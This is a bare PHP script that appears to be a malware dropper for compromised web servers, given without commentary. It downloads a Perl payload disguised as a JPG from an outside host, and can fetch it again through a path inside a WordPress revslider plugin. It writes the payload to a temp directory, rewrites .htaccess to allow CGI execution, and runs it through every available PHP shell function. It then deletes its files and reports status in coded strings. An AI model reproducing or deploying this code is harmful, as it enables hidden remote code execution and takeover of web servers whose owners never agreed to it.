$u0="http://interdigitalmedia.com/n4.jpg";
$u1=$u0;
$u2='http://stratigery.com/wordpress/wp-content/plugins/revslider/temp/update_extract/revslider/';
$sz=329;

$n="httpd";
$u="";
$t="";
$s="";
$a="";
$m=0; if(strtolower(substr(PHP_OS,0,3))=="win") $m=1;

$d=array(".","/tmp","/var/tmp","/usr/tmp");
$p=@getenv("TEMP"); if($p) array_push($d,$p);
$p=@getenv("TMP"); if($p) array_push($d,$p);

foreach($d as $p)
{
	if(is_dir($p) && is_writable($p))
	{
		if($m)
		{
			$u=$u1;
			$t="$p\\$n.pl";
			if($p==".")
			{
				$a="$p\\htaccess.txt";
				$u2 .= "$n.pl";
			}
		}
		else
		{
			$u=$u0;
			$t="$p/$n.pl";
			if($p==".")
			{
				$a="$p/.htaccess";
				$u2 .= "$n.pl";
			}
		}

		break;
	}
}

if(!$t)
{
	echo(16384-84)."z5a7ht8d$m";
	exit;
}

@unlink($t);

if(function_exists("file_get_contents"))
{
	$s=@file_get_contents($u);
}
if($sz != strlen($s)) $s="";

if(!$s)
{
	if(function_exists("curl_init"))
	{
		$h=@curl_init();
		if($h)
		{
			@curl_setopt($h,CURLOPT_URL,$u);
			@curl_setopt($h,CURLOPT_RETURNTRANSFER,1);
			@curl_setopt($h,CURLOPT_HEADER,0);
			@curl_setopt($h,CURLOPT_USERAGENT,"Mozilla/5.0 (Windows; U; Windows NT 5.1; en; rv:1.9.0.8) Gecko/2009032609 Firefox/3.0.8");
			@curl_setopt($h,CURLOPT_CONNECTTIMEOUT,15);
			@curl_setopt($h,CURLOPT_TIMEOUT,15);
			$s=@curl_exec($h);
			@curl_close($h);
		}
	}
}
if($sz != strlen($s)) $s="";

if(!$s)
{
	echo(16384-83)."z5a7ht8d$m";
	exit;
}

$w=0;
$h=@fopen($t,"w");
if($h)
{
	$w=@fwrite($h,$s);
	@fclose($h);
}

if(!$w)
{
	echo(16384-82)."z5a7ht8d$m";
	exit;
}
@chmod($t,0755);

if($a)
{
	@unlink($a);
	$h=@fopen($a,"w");
	if($h)
	{
		@fwrite($h,"Options +ExecCGI\nAddType application/x-httpd-cgi .cgi .pl\n");
		@fclose($h);
	}
	if(function_exists("file_get_contents"))
	{
		$s=@file_get_contents($u2);
	}
	if(!$s)
	{
		if(function_exists("curl_init"))
		{
			$h=@curl_init();
			if($h)
			{
				@curl_setopt($h,CURLOPT_URL,$u2);
				@curl_setopt($h,CURLOPT_RETURNTRANSFER,1);
				@curl_setopt($h,CURLOPT_HEADER,0);
				@curl_setopt($h,CURLOPT_USERAGENT,"Mozilla/5.0 (Windows; U; Windows NT 5.1; en; rv:1.9.0.8) Gecko/2009032609 Firefox/3.0.8");
				@curl_setopt($h,CURLOPT_CONNECTTIMEOUT,5);
				@curl_setopt($h,CURLOPT_TIMEOUT,5);
				$s=@curl_exec($h);
				@curl_close($h);
			}
		}
	}

	@unlink($a);
	echo $s;
}

$i="";
$o="";
$w=0;

if($m)
{
	$i="perl $t";
}
else
{
	$i="chmod +x $t && /usr/bin/perl $t";
}

if(function_exists("system"))
{
	$w=1;
	ob_start();
	@system($i);
	$o=ob_get_clean();
}
elseif(function_exists("exec"))
{
	$w=2;
	@exec($i,$o);
	$o=@join("\n",$o);
}
elseif(function_exists("passthru"))
{
	$w=3;
	ob_start();
	@passthru($i);
	$o=ob_get_clean();
}
elseif(function_exists("shell_exec"))
{
	$w=4;
	$o=@shell_exec($i);
}
elseif(is_resource($h=@popen($i,"r")))
{
	$w=5;
	while(!@feof($h))
	{
		$o.=@fread($h,1024);
	}
	@pclose($h);
}

@unlink($t);
if($a) @unlink($a);
echo(16384+16)."sa3de4dk$m$w$o$t";
exit;
